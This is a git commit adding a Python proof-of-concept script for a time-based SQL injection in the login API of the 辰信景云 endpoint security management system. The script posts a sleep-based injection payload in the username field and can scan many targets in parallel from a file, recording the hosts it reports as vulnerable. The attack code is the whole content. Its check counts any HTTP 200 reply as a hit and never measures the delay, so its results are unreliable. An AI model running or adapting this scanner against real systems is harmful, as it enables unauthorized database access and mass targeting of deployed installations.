a6e288a553983113233d2c3eca67a05fdf058e76
CHKer109 <642971737@qq.com>
2024-07-31 21:03:18 +0800

    辰信景云终端安全管理系统 login SQL 注入漏洞

---
+++ POC_29.py
@@ -0,0 +1,66 @@
+# 辰信景云终端安全管理系统 login SQL 注入漏洞 
+import requests,sys,re,argparse,time
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+
+def banner():
+    test=""" ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░       ░▒▓███████▓▒░░▒▓██████▓▒░░▒▓█▓▒░        
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
+░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
+░▒▓█▓▒░       ░▒▓██████▓▒░        ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
+░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
+ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░ 
+                                                 ░▒▓█▓▒░                  
+                                                                            author:CHKer
+                                                                            version:1.0.0             
+                                                                                         
+"""
+
+    print(test)
+
+
+
+def main():
+    banner()
+    parser=argparse.ArgumentParser(description='辰信景云终端安全管理系统 login SQL 注入漏洞 ')
+    parser.add_argument('-u','--url',dest='url',type=str,help='input the url')
+    parser.add_argument('-f','--file',dest='file',type=str,help='input the file')
+    args=parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        url_list=[]
+        with open(args.file,'r',encoding='utf-8')as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip())
+        mp=Pool(100)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+
+
+
+def poc(target):
+    payload = '/api/user/login'
+    data = "captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(3))a)='"
+
+    try:
+        res1=requests.post(url=target+payload,timeout=10,data=data)
+        if res1.status_code==200:
+            print( f"[+]{target} 存在漏洞！")
+            with open('result29.txt','a',encoding='utf-8')as fp:
+                fp.write(target+'\n')
+                return True
+        else:
+            print('[-] 不存在漏洞')
+            return False
+    except:
+        print('目标网站存在问题，无法访问')
+
+
+
+if __name__ =='__main__':
+    main()
